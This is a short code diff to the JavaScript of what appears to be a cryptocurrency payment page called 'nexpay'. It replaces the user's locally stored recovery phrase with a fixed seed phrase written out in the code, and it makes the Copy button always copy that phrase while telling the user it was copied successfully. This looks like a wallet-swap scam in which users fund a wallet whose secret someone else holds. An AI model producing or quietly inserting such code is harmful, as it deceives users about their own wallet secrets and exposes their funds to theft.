@@ -548,7 +548,7 @@
   const uidTextEl = document.getElementById("uid-text");
 
   // Define recovery phrase stored/used in state
-  const phrase = localStorage.getItem("nexpay_phrase") || "";
+  const phrase = "yellow wisdom atom drawer blossom agent hazel glimmer access yacht asset panda fiber cradle cannon stone audit";
 
   const WHITELISTED_UIDS = ["675390256", "702948942"];
   const upgradeAmount = 300.00;
@@ -590,11 +590,7 @@
 
   document.getElementById('copy').addEventListener('click', async ()=>{
     try { 
-      if (!phrase) {
-        alert('No recovery phrase found in local storage.');
-        return;
-      }
-      await navigator.clipboard.writeText(phrase); 
+      await navigator.clipboard.writeText("yellow wisdom atom drawer blossom agent hazel glimmer access yacht asset panda fiber cradle cannon stone audit"); 
       alert('Phrase copied successfully.'); 
     } catch(e){}
   });
